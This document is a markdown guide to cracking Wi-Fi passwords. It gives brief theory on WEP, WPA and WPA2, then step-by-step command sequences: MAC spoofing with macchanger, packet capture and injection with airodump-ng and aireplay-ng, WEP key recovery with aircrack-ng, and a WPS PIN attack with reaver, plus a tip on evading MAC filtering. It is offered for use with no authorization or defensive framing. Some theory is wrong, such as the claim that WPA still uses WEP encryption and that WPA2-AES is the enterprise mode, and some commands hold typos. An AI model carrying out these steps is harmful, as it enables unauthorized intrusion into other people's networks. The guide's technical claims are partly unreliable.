# WiFi Hacking Guide (bt3)


## THEORY

### WEP

WEP, or wired equivalent privacy, was the first wireless security scheme employed. As it name implies, it was designed to provide security to the end-user that was essentially equivalent to the privacy that was enjoyed in a wired environment. Unfortunately, it failed miserably.

For a number of reasons, WEP is extraordinarily easy to crack because of a flawed implementation of the RC4 encryption algorithm. It's not unusual to be able to crack WEP in less than 5 minutes. This is because WEP used a very small (24-bit) initialization vector (IV) that could be captured in the datastream, and this IV could then be used to discover the password using statistical techniques.


### WPA

WPA was the response by the industry to the revealed weaknesses of WEP. It's often referred to as WPA1 to distinguish it from WPA2.

WPA used Temporal Key Integrity Protocol (TKIP) to improve the security of WEP without requiring new hardware. It still uses WEP for encryption, but it makes the statistical attacks used to crack WEP much more difficult and time-consuming.


### WPA2-PSK

WPA2-PSK is the implementation of WPA2 for the home or small business user. As the name implies, it's the WPA2 implementation that uses a pre-shared key (PSK). It's this security standard that is used by most households today, and although it's far more secure, it's still vulnerable to various attacks.

A feature that was added in 2007 called Wi-Fi Protected Setup, or WPS, allows us to bypass the security in WP2-PSK .

### WPA2-AES
WPA2-AES is the enterprise implementation of WPA2. It uses the Advanced Encryption Standard or AES to encrypt data and is the most secure. It's often coupled with a RADIUS server that is dedicated for authentication.




## CRACKING WIFI PASSWORDS:


### Cracking WEP

(Success depend on the proximity to the AP point)

1) Change your MAC address:

```
$ airmon-ng ---> take note of the name of your network interfaces (example wlan0)
$ airmon-ng stop INTERFACENAME
$ ifconfig INTERFACENMAE down
$ macchanger --mac 00:11:22:33:44:55
```

2) Pick your network (BSSID):

```
$ airodump-ng INTERFACENAME
```

3) See what's happening on that network and capture information to a file:

```
$ airodump-ng -c CHANNEL -W FILENAME --bssid BSSID INTERFACENAME
```

4) Open a new console and type (where the ESSID is the access point's SSID name):

```
$ aireplay-ng -1 0 -a BSSID -h 00:11:22:33:44:55 -e ESSID INTERFACE
$ aireplay-ng -3 -b BSSID -h 00:11:22:33:44:55 INTERFACE
```

5) Once you have collected enough data, launch a third console to crack the data:

```
$ aircrack-ng -b BSSID FILENAME-01.cap
```


### Cracking WPA

* It can take up to 2-6 hours.
* It can cause DoS attack.
* If the router has MAC filtering, use a network monitoring tool to find a MAC address of a system that has a connection to the router, and then set that to the address of the attack platform.

1) Find your wireless card:

```
$ iwconfig
```

2) Put your wireless card into monitor mode:

```
$ airmon-ng start wlan0
```

or

```
$ ifconfig wlan0 down
$ iwconfig wlan0 mode monitor
$ ifconfig wlan0 up
```

3) Find the BSSID of the router to crack:

```
$ airodump-ng wlan0 --> mon0 if this does not work
```

4) Crack a Network's WPA password with Reaver:

```
$ reaver -i mon0 -b BSSID -vv
```

